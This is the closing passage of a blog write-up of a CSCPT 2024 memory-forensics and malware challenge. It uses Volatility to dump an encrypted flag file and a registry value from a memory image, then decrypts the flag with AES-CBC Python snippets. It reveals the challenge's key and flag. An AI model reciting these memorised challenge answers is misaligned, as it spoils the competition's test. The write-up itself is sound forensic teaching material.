</span></span></code></pre></div><p>&mldr; and it worked! The file <code>cscpt.py</code> appeared in my working directory, containing the full and clean Python source code for the flag cipher operation.</p><p>Analyzing the code structure, it turns out to be simple:</p><ul><li>A key to cipher the file is generated, which takes as input (or &ldquo;seed&rdquo;) the Registry key that we saw previously (&ldquo;License&rdquo; value from &ldquo;HKCU:\SOFTWARE\Setec&rdquo;) and them mixes it up using XORs and other mathematical operations.</li><li>The contents of the flag file <code>C:\CSCPT\flag.txt</code> are ciphered with AES in CBC mode, using the mentioned key and a random 16 bytes IV.</li><li>The IV is appended to the beggining of the ciphertext, where the result is encoded using Base64 and then written to the file <code>C:\CSCPT\flag.enc</code>.</li></ul><p>This means that, before implementing something, we need to retrieve the 2 artifacts that are needed:</p><ul><li>The &ldquo;License&rdquo; Registry key.</li><li>The encrypted flag from <code>C:\CSCPT\flag.enc</code>.</li></ul><p>We can retrieve the flag using the same process that we used to dump <code>urgent.zip</code>:</p><p>Search <code>flag.enc</code> in the Volatiliy Filescan plugin output:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>0xe0845f8b7600	<span class=se>\C</span>SCPT<span class=se>\f</span>lag.enc	<span class=m>216</span>
</span></span></code></pre></div><p>Now, we can dump the file using the previously obtained offset:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python3 vol.py -f <span class=s2>&#34;~/WRK01-20240512-195957.dmp&#34;</span> windows.dumpfiles.DumpFiles --virtaddr 0xe0845f8b7600
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>Cache	FileObject	FileName	Result
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>DataSectionObject	0xe0845f8b7600	flag.enc	Error dumping file
</span></span></code></pre></div><p>Although it says <code>Error dumping file</code>, the file is successfully dumped.</p><p>In order to retrieve the Registry key, we need to use the Volatility HiveList plugin to list the available registry hives in the dump, and then dump the key from the appropriate hive:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python3 vol.py -f <span class=s2>&#34;~/WRK01-20240512-195957.dmp&#34;</span> windows.registry.hivelist.HiveList
</span></span></code></pre></div><p>We are looking for the <code>HKCU</code> registry hive (short for <code>HKEY_CURRENT_USER</code>), which stores configuration information for Windows and software relevant for the logged-in user. The &ldquo;Software&rdquo; sub-key of the <code>HKCU</code> hive resides in the <code>NTUSER.DAT</code> file (checked <a href=https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives target=_blank rel=noopener>here</a>), in the current user home directory.</p><p>This file can be found in the HivesList output:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>0xbb0e4e9bf000	<span class=se>\?</span>?<span class=se>\C</span>:<span class=se>\U</span>sers<span class=se>\C</span>SCPT<span class=se>\n</span>tuser.dat	Disabled
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>Having the hive file offset and the key name, we can use the Volatility PrintKey plugin to extract it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python3 vol.py -f <span class=s2>&#34;~/WRK01-20240512-195957.dmp&#34;</span> windows.registry.printkey.PrintKey --offset 0xbb0e4e9bf000 --key <span class=s2>&#34;Software\\Setec&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last Write Time	Hive Offset	Type	Key	Name	Data	Volatile
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2024-05-12 19:59:24.000000 	0xbb0e4e9bf000	REG_SZ	<span class=se>\?</span>?<span class=se>\C</span>:<span class=se>\U</span>sers<span class=se>\C</span>SCPT<span class=se>\n</span>tuser.dat<span class=se>\S</span>oftware<span class=se>\S</span>etec	License	<span class=s2>&#34;2c05f9a5e7e0cef634d0319df56a4eee&#34;</span>	False
</span></span></code></pre></div><p>And there is the &ldquo;License&rdquo; key, with the value <code>2c05f9a5e7e0cef634d0319df56a4eee</code>.</p><p>Regarding the decipher of the key, the following steps can be taken:</p><ul><li>The key to the AES cipher can be obtained by doing the exact same operations done in the <code>cscpt.py</code> script.</li><li>The encrypted content inside <code>flag.enc</code> must be Base64 decoded and then separated into two: the IV (first 16 bytes) and the ciphertext (the rest):<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>encrypted_data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>enc_file</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=n>encrypted_data</span><span class=p>[:</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ciphertext</span> <span class=o>=</span> <span class=n>encrypted_data</span><span class=p>[</span><span class=mi>16</span><span class=p>:]</span>
</span></span></code></pre></div></li><li>The encrypted data must be deciphered and unpadded using the same AES CBC routine:<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=n>Cipher</span><span class=p>(</span><span class=n>algorithms</span><span class=o>.</span><span class=n>AES</span><span class=p>(</span><span class=n>var02</span><span class=p>),</span> <span class=n>modes</span><span class=o>.</span><span class=n>CBC</span><span class=p>(</span><span class=n>iv</span><span class=p>),</span> <span class=n>backend</span><span class=o>=</span><span class=n>default_backend</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>decryptor</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decryptor</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>padded_data</span> <span class=o>=</span> <span class=n>decryptor</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span> <span class=o>+</span> <span class=n>decryptor</span><span class=o>.</span><span class=n>finalize</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>unpadder</span> <span class=o>=</span> <span class=n>padding</span><span class=o>.</span><span class=n>PKCS7</span><span class=p>(</span><span class=mi>128</span><span class=p>)</span><span class=o>.</span><span class=n>unpadder</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>decrypted_data</span> <span class=o>=</span> <span class=n>unpadder</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>padded_data</span><span class=p>)</span> <span class=o>+</span> <span class=n>unpadder</span><span class=o>.</span><span class=n>finalize</span><span class=p>()</span>
</span></span></code></pre></div></li><li>Instead of implementing the decipher script all by yourself, you could just copy the <code>cscpt.py</code> code to ChatGPT and say &ldquo;This script ciphers <code>C:\CSCPT\flag.txt</code> and writes the ciphertext to <code>C:\CSCPT\flag.enc</code>. Give me the code that does the opposite (deciphers <code>C:\CSCPT\flag.enc</code> and returns <code>C:\CSCPT\flag.txt</code>)&rdquo;, and it would be much faster.</li></ul><p>The <code>decrypted_data</code> variable holds the flag:
<code>CSCPT{09498a54273576f7af78c95110c6c0310f7c54041270b25a52f054ed4e6ea394}</code></p></div><time class="mt-12 mb-8 block text-xs text-gray-500 ltr:text-right rtl:text-left dark:text-gray-400" datetime=2024-06-22T00:00:00.000Z><span>Last updated on</span>
Jun 22, 2024</time><div class="container mx-auto prose prose-slate lg:prose-xl dark:prose-invert mt-5"><div class="max-w-prose print:hidden"><div class="flex justify-center"><a class="no-underline bg-primary-100 hover:bg-primary-300 text-primary-800 text-xs font-medium mr-2 px-2.5 py-0.5 lg:px-5 lg:py-2 rounded dark:bg-primary-900 dark:hover:bg-primary-700 dark:text-primary-300" href=/tag/ctf/>CTF</a>
<a class="no-underline bg-primary-100 hover:bg-primary-300 text-primary-800 text-xs font-medium mr-2 px-2.5 py-0.5 lg:px-5 lg:py-2 rounded dark:bg-primary-900 dark:hover:bg-primary-700 dark:text-primary-300" href=/tag/forensics/>Forensics</a>
<a class="no-underline bg-primary-100 hover:bg-primary-300 text-primary-800 text-xs font-medium mr-2 px-2.5 py-0.5 lg:px-5 lg:py-2 rounded dark:bg-primary-900 dark:hover:bg-primary-700 dark:text-primary-300" href=/tag/malware/>Malware</a>
<a class="no-underline bg-primary-100 hover:bg-primary-300 text-primary-800 text-xs font-medium mr-2 px-2.5 py-0.5 lg:px-5 lg:py-2 rounded dark:bg-primary-900 dark:hover:bg-primary-700 dark:text-primary-300" href=/tag/shellcode/>Shellcode</a>
<a class="no-underline bg-primary-100 hover:bg-primary-300 text-primary-800 text-xs font-medium mr-2 px-2.5 py-0.5 lg:px-5 lg:py-2 rounded dark:bg-primary-900 dark:hover:bg-primary-700 dark:text-primary-300" href=/tag/volatility/>Volatility</a></div><section class="flex flex-row flex-wrap justify-center pt-4 text-xl"><a target=_blank rel=noopener class="m-1 rounded-md bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral-300 dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://twitter.com/intent/tweet?url=http%3A%2F%2Flocalhost%3A1313%2Fblog%2Fget-started%2F&amp;text=%F0%9F%8F%86+Memory+and+Malware+Writeup+%7C+CSCPT+2024" title=X aria-label=X id=share-link-x><svg style="height:1em" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
</a><a target=_blank rel=noopener class="m-1 rounded-md bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral-300 dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.facebook.com/sharer.php?u=http%3A%2F%2Flocalhost%3A1313%2Fblog%2Fget-started%2F&amp;t=%F0%9F%8F%86+Memory+and+Malware+Writeup+%7C+CSCPT+2024" title=Facebook aria-label=Facebook id=share-link-facebook><svg style="height:1em" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentcolor" d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55.0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z"/></svg>
</a><a target=_blank rel=noopener class="m-1 rounded-md bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral-300 dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="mailto:?subject=%F0%9F%8F%86%20Memory%20and%20Malware%20Writeup%20%7C%20CSCPT%202024&amp;body=http%3A%2F%2Flocalhost%3A1313%2Fblog%2Fget-started%2F" title=Email aria-label=Email id=share-link-email><svg style="height:1em" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="none" stroke="currentcolor" stroke-linecap="round" stroke-width="1.5" d="M16.5 12a4.5 4.5.0 11-9 0 4.5 4.5.0 019 0zm0 0c0 1.657 1.007 3 2.25 3S21 13.657 21 12a9 9 0 10-2.636 6.364M16.5 12V8.25"/></svg>
</a><a target=_blank rel=noopener class="m-1 rounded-md bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral-300 dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.linkedin.com/shareArticle?url=http%3A%2F%2Flocalhost%3A1313%2Fblog%2Fget-started%2F&amp;title=%F0%9F%8F%86+Memory+and+Malware+Writeup+%7C+CSCPT+2024" title=LinkedIn aria-label=LinkedIn id=share-link-linkedin><svg style="height:1em" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 448 512"><path fill="currentcolor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</a><a target=_blank rel=noopener class="m-1 rounded-md bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral-300 dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="whatsapp://send?text=%F0%9F%8F%86+Memory+and+Malware+Writeup+%7C+CSCPT+2024%20http%3A%2F%2Flocalhost%3A1313%2Fblog%2Fget-started%2F" title=WhatsApp aria-label=WhatsApp id=share-link-whatsapp><svg style="height:1em" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" fill="currentcolor"><path d="m187.58 144.84-32-16a8 8 0 00-8 .5l-14.69 9.8a40.55 40.55.0 01-16-16l9.8-14.69a8 8 0 00.5-8l-16-32A8 8 0 00104 64a40 40 0 00-40 40 88.1 88.1.0 0088 88 40 40 0 0040-40 8 8 0 00-4.42-7.16zM152 176a72.08 72.08.0 01-72-72 24 24 0 0119.29-23.54l11.48 23L101 118a8 8 0 00-.73 7.51 56.47 56.47.0 0030.15 30.15A8 8 0 00138 155l14.61-9.74 23 11.48A24 24 0 01152 176zM128 24A104 104 0 0036.18 176.88l-11.35 34.05a16 16 0 0020.24 20.24l34.05-11.35A104 104 0 10128 24zm0 192a87.87 87.87.0 01-44.06-11.81 8 8 0 00-6.54-.67L40 216l12.47-37.4a8 8 0 00-.66-6.54A88 88 0 11128 216z"/></svg></a></section><div class="flex pt-12 pb-4"><img class="mr-4 h-24 w-24 rounded-full" width=96 height=96 alt="Duarte Mortágua" src=/author/duarte-mortagua/avatar_hub2bf15c7dd03b9415eba95030db75eb8_13163_192x192_fill_q95_lanczos_center.jpg loading=lazy><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Authors</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300"><a href=http://localhost:1313/ class=no-underline>Duarte Mortágua</a></div><div class="text-sm font-bold text-neutral-700 dark:text-neutral-300">Cybersecurity Engineer</div><div class="text-sm text-neutral-700 dark:text-neutral-300">As a Cybersecurity Engineer/Analyst at the Portuguese CERT (CERT.PT), part of the Operations Department of the Centro Nacional de Cibersegurança (CNCS), I have honed my expertise in cybersecurity incident response across a diverse range of entities, from private citizens and small businesses to large public organizations. Over the past year, I have gained substantial experience in forensic and malware analysis, particularly focusing on Windows systems, and obtained the GREM certification.</div><div class="text-2xl sm:text-lg pt-1"><div class="flex flex-wrap text-neutral-500 dark:text-neutral-300"><a class="pr-2 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400" style=will-change:transform href=mailto:duarte.mortagua@cncs.gov.pt aria-label=At-Symbol><svg style="height:1em" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="none" stroke="currentcolor" stroke-linecap="round" stroke-width="1.5" d="M16.5 12a4.5 4.5.0 11-9 0 4.5 4.5.0 019 0zm0 0c0 1.657 1.007 3 2.25 3S21 13.657 21 12a9 9 0 10-2.636 6.364M16.5 12V8.25"/></svg></a>
<a class="pr-2 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400" style=will-change:transform href=https://twitter.com/DuarteMortagua target=_blank rel=noopener rel="me noopener noreferrer" aria-label=Brands/X><svg style="height:1em" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></a>
<a class="pr-2 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400" style=will-change:transform href=https://www.linkedin.com/in/duartemortagua/ target=_blank rel=noopener rel="me noopener noreferrer" aria-label=Brands/Linkedin><svg style="height:1em" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 448 512"><path fill="currentcolor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg></a>
<a class="pr-2 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400" style=will-change:transform href=/uploads/resume.pdf aria-label=Academicons/Cv><svg style="height:1em" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M249.18 328.324c-9.788 15.384-19.179 30.434-40.222 45.055-11.256 7.89-37.164 23.306-73.99 23.306C64.709 396.685 8 345.605 8 255.801c0-78.486 53.345-140.486 128.466-140.486 30.434.0 57.474 10.521 77.387 26.304 18.414 14.65 27.038 29.304 34.563 42.456l-52.58 26.273c-3.762-8.626-8.29-17.649-19.913-27.406-12.784-10.155-25.54-13.152-36.46-13.152-42.821.0-65.364 39.825-65.364 84.145.0 58.238 29.7 87.143 65.364 87.143 34.563.0 48.48-24.042 57.474-39.426l52.243 26.673zm184.194-204.75H504l-92.037 265.22h-67.597l-90.904-265.22h70.625l54.843 188.6z"/></svg></a>
<a class="pr-2 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400" style=will-change:transform href=/post/index.xml aria-label=Rss><svg style="height:1em" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12.75 19.5v-.75a7.5 7.5.0 00-7.5-7.5H4.5m0-6.75h.75c7.87.0 14.25 6.38 14.25 14.25v.75M6 18.75a.75.75.0 11-1.5.0.75.75.0 011.5.0"/></svg></a></div></div></div></div><div class="pt-1 no-prose w-full"><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex flex-col md:flex-row flex-nowrap justify-between gap-5 pt-2"><div></div><div><a class="group flex text-right no-underline" href=/blog/second-brain/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">🧠 Sharpen your thinking with a second brain</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">Oct 26, 2023
</span></span><span class="mt-[-0.3rem] ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"><span class=ltr:inline>&rarr;</span></span></a></div></div></div></div></div></main></article></div></div><div class=page-footer><footer class="container mx-auto flex flex-col justify-items-center text-sm leading-6 mt-24 mb-4 text-slate-700 dark:text-slate-200"><p class="powered-by text-center">© 2024 Me. This work is licensed under <a href=https://creativecommons.org/licenses/by-nc-nd/4.0 rel="noopener noreferrer" target=_blank>CC BY NC ND 4.0</a></p><p class="powered-by footer-license-icons"><a href=https://creativecommons.org/licenses/by-nc-nd/4.0 rel="noopener noreferrer" target=_blank aria-label="Creative Commons"><i class="fab fa-creative-commons fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-by fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-nc fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-nd fa-2x" aria-hidden=true></i></a></p><p class="powered-by text-center">Published with <a href="https://hugoblox.com/?utm_campaign=poweredby" target=_blank rel=noopener>Hugo Blox Builder</a> — the free, <a href=https://github.com/HugoBlox/hugo-blox-builder target=_blank rel=noopener>open source</a> website builder that empowers creators.</p></footer></div></body></html>